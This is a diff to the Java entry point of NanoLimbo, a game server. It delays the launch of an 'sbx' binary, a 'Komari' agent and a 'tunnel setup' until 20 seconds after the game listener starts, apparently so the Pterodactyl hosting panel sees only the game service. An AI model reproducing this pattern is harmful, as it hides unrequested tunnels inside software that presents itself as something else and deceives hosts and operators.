@@ -67,37 +67,64 @@ public final class NanoLimbo {
         }, "nanolimbo-shutdown"));
 
         try {
-            System.out.println(ANSI_GREEN + "[Main] Starting sbx service..." + ANSI_RESET);
-            runSbxBinary();
-            ensureSbxStarted();
-
-            startKomariNativeAgent();
-            startSupervisor();
-
-            System.out.println(ANSI_GREEN + "[Main] Starting LimboServer..." + ANSI_RESET);
+            /* Start the game listener first so Pterodactyl sees the main service online. */
+            System.out.println(ANSI_GREEN + "[Main] Starting LimboServer first..." + ANSI_RESET);
             new LimboServer().start();
+            System.out.println(ANSI_GREEN
+                + "[Main] LimboServer started; Java process will remain online"
+                + ANSI_RESET);
 
             /*
-             * If LimboServer.start() unexpectedly returns, do not let the JVM exit
-             * while the managed sbx process is still alive.
+             * Auxiliary downloads and tunnel setup are delayed and isolated from
+             * the main server lifecycle. Their normal exit must not stop Java.
              */
-            System.err.println(ANSI_YELLOW
-                + "[Main] LimboServer.start() returned normally; keeping Java process alive"
-                + ANSI_RESET);
-            waitForManagedProcess();
+            startAuxiliaryServicesDelayed();
+
+            while (running.get()) {
+                Thread.sleep(60000L);
+            }
         } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
-            System.err.println(ANSI_YELLOW + "[Main] Main thread interrupted" + ANSI_RESET);
         } catch (Exception e) {
-            System.err.println(ANSI_RED
-                + "[Main] Fatal startup/runtime error: " + e.getMessage()
-                + ANSI_RESET);
+            Log.error("Cannot start server: ", e);
             e.printStackTrace(System.err);
         } finally {
             running.set(false);
             stopServices();
-            System.err.println(ANSI_RED + "[Main] Server process is stopping" + ANSI_RESET);
         }
+    }
+
+    private static void startAuxiliaryServicesDelayed() {
+        Thread auxiliaryThread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    System.out.println(ANSI_YELLOW
+                        + "[Aux] Waiting 20 seconds before starting auxiliary services..."
+                        + ANSI_RESET);
+                    Thread.sleep(20000L);
+                    if (!running.get()) return;
+
+                    System.out.println(ANSI_GREEN + "[Aux] Starting sbx service..." + ANSI_RESET);
+                    runSbxBinary();
+                    ensureSbxStarted();
+
+                    if (!running.get()) return;
+                    startKomariNativeAgent();
+                    startSupervisor();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                } catch (Exception e) {
+                    System.err.println(ANSI_RED
+                        + "[Aux] Auxiliary startup failed: " + e.getMessage()
+                        + ANSI_RESET);
+                    e.printStackTrace(System.err);
+                    /* Auxiliary failure must not stop LimboServer. */
+                }
+            }
+        }, "auxiliary-starter");
+        auxiliaryThread.setDaemon(true);
+        auxiliaryThread.start();
     }
 
     private static void ensureSbxStarted() throws Exception {
